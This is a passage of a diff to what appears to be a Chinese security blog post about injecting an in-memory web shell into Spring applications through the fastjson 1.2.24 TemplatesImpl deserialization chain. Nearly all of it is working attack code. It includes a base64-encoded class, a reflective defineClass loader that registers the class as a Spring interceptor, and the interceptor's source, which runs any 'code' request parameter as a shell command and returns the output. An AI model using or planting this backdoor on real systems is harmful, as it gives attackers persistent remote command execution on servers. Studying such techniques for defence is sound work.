cml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoACEAHwAgAAAAAAACAAEAIQAiAAEAIwAAAC8AAQABAAAABSq3AAGxAAAAAgAkAAAABgABAAAABwAlAAAADAABAAAABQAmACcAAAABACgAKQACACMAAAG6AAYACQAAAK8rEgK5AAMCADoEGQTGAKEsuQAEAQA6BRIFOgYSBrgAB7YACBIJtgAKmQAiuwALWQa9AAxZAxINU1kEEg5TWQUZBFO3AA86B6cAH7sAC1kGvQAMWQMSEFNZBBIRU1kFGQRTtwAPOge7ABJZGQe2ABO2ABS3ABUSFrYAFzoIGQi2ABiZAAsZCLYAGacABRkGOgYZCLYAGhkFGQa2ABsZBbYAHBkFtgAdpwAFOgUDrASsAAEADwCmAKkAHgADACQAAABGABEAAAAKAAoACwAPAA0AFwAOABsAEAArABEASgATAGYAFQB8ABYAkAAXAJUAGACcABkAoQAaAKYAHACpABsAqwAdAK0AHwAlAAAAZgAKAEcAAwAqACsABwAXAI8ALAAtAAUAGwCLAC4ALwAGAGYAQAAqACsABwB8ACoAMAAxAAgAAACvACYAJwAAAAAArwAyADMAAQAAAK8ANAA1AAIAAACvADYANwADAAoApQA4AC8ABAA5AAAAOQAH/gBKBwA6BwA7BwA6/AAbBwA8/AAlBwA9QQcAOv8AGgAFBwA+BwA/BwBABwBBBwA6AAEHAEIBAQBDAAAABAABAB4AAQBEAAAAAgBF&#34;</span><span class="o">;</span> <span class="c1">// magicInterceptor类class的base64编码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">BASE64Decoder</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">b64</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassLoader</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m0</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">m0</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">m0</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">classLoader</span><span class="o">,</span> <span class="n">className</span><span class="o">,</span> <span class="n">bytes</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//添加com.example.spring.magicInterceptor类到adaptedInterceptors
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">adaptedInterceptors</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">classLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">className</span><span class="o">).</span><span class="na">newInstance</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><code>magicInterceptor</code>拦截器，重写<code>preHandle</code>方法，并将该class编码。</p>
 <div class="highlight"><div class="chroma">
@@ -1154,40 +1154,40 @@ org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping�
 </span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.example.spring</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.handler.HandlerInterceptorAdapter</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">magicInterceptor</span> <span class="kd">extends</span> <span class="n">HandlerInterceptorAdapter</span> <span class="o">{</span>
-    <span class="nd">@Override</span>
-    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
-        <span class="n">String</span> <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;code&#34;</span><span class="o">);</span>
-        <span class="k">if</span><span class="o">(</span><span class="n">code</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
-            <span class="k">try</span> <span class="o">{</span>
-                <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">PrintWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
-                <span class="n">String</span> <span class="n">o</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
-                <span class="n">ProcessBuilder</span> <span class="n">p</span><span class="o">;</span>
-                <span class="k">if</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;win&#34;</span><span class="o">)){</span>
-                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">code</span><span class="o">});</span>
-                <span class="o">}</span><span class="k">else</span><span class="o">{</span>
-                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">code</span><span class="o">});</span>
-                <span class="o">}</span>
-                <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">c</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">start</span><span class="o">().</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\\\A&#34;</span><span class="o">);</span>
-                <span class="n">o</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">c</span><span class="o">.</span><span class="na">next</span><span class="o">():</span> <span class="n">o</span><span class="o">;</span>
-                <span class="n">c</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
-                <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
-                <span class="n">writer</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
-                <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
-            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
-            <span class="o">}</span>
-            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-        <span class="o">}</span>
-        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-    <span class="o">}</span>
-
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.example.spring</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.handler.HandlerInterceptorAdapter</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">magicInterceptor</span> <span class="kd">extends</span> <span class="n">HandlerInterceptorAdapter</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;code&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span><span class="n">code</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">PrintWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">o</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ProcessBuilder</span> <span class="n">p</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;win&#34;</span><span class="o">)){</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">code</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">code</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">c</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">start</span><span class="o">().</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\\\A&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">o</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">c</span><span class="o">.</span><span class="na">next</span><span class="o">():</span> <span class="n">o</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">c</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>利用fastjson 1.2.24的TemplatesImpl利用链，加载字节码。
 <img src="/images/image-20211106230818.png" alt="">
